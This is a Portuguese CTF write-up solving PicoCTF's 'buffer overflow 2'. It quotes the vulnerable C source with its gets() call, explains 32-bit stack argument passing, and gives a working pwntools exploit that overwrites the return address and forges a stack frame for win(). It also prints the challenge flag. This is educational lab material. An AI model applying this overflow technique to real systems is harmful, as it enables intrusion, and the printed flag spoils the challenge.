# WriteUp: buffer overflow 2
## Descrição do Desafio:
**Author**: Sanjay C / Palash Oswal \
**Plataforma**: [PicoCTF](https://play.picoctf.org/practice/challenge/259?category=6&page=2) \
**Categoria**: Binary Exploitation \
**Dificuldade**: Média \
**Data**: 2022 \
**Descrição**:
> Control the return address and arguments
## Passo a Passo da Solução
### 1. Análise do arquivo fornecido
Assim como os anteriores, este fornece o arquivo fonte, `vuln.c`. A análise dele é basicamente a mesma do `buffer overflow 1`, com vulnerabilidade de `buffer overflow` na função `vuln()`. A diferença é que a função `win()` necessita de dois parâmetros.
```c
void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}
```
### 2. Exploit
O objetivo é o mesmo do anterior, temos que controlar o retorno da função `vuln()` para ela retornar para a função `win()`, mas também temos que passar dois parâmetros, o primeiro com valor de `0xCAFEF00D` e o segundo com valor de `0xF00DF00D`.

Aqui é necessário entender um pouco sobre como a pilha fica quando chamamos uma função. No desafio anterior eu disse que o endereço de retorno é colocado no topo da pilha, guarde isso, mas agora temos que saber como os parâmetros são passados.

Bom, isso depende da arquitetura, se for 32-bits (nosso caso) os parâmetros são passados pela pilha, em ordem decrescente, de forma que a pilha tem que ficar mais ou menos assim:
```
+-----Stack-----+
|   End. Ret    |
|    Param 1    |
|    Param 2    |
|      ...      |
+---------------+
```
E se for 64-bits, os parâmetros são passados por meio dos registradores, sendo necessário fazer `ROP` para conseguir passar parâmetros.
### 3. Solução
Novamente, o primeiro passo é identificar quantos bytes serão escritos até chegar no endereço de retorno. Após isso, sobrescrevemos o endereço de retorno para ser o endereço da função `win()`, e por fim temos que forjar uma pilha para a função `win()`, ou seja, temos que colocar no topo um endereço para ela retornar (lixo para nós), o parâmetro 1, e por fim o 2.

### 3.1 Solução com Python
```py
from pwn import *

elf = context.binary = ELF("./vuln")
p = remote(ip, porta) #Troque pelos valores fornecidos

payload = flat(
    "A" * 112,        #Lixo - padding
    elf.sym["win"],   #Endereço de retorno da Vuln
    #Forjando pilha da Win
    0x0,              #Endereço de retorno da Win (topo)
    0xCAFEF00D,       #Parâmetro 1
    0xF00DF00D        #Parâmetro 2
)

p.sendlineafter(b"string: ", payload)
p.recvlinesS(2)
print(p.recvall())
```

### Flag
`picoCTF{argum3nt5_4_d4yZ_3c04eab0}`

## Autor
[Membro de Exploitation - HenriUz](https://github.com/HenriUz)
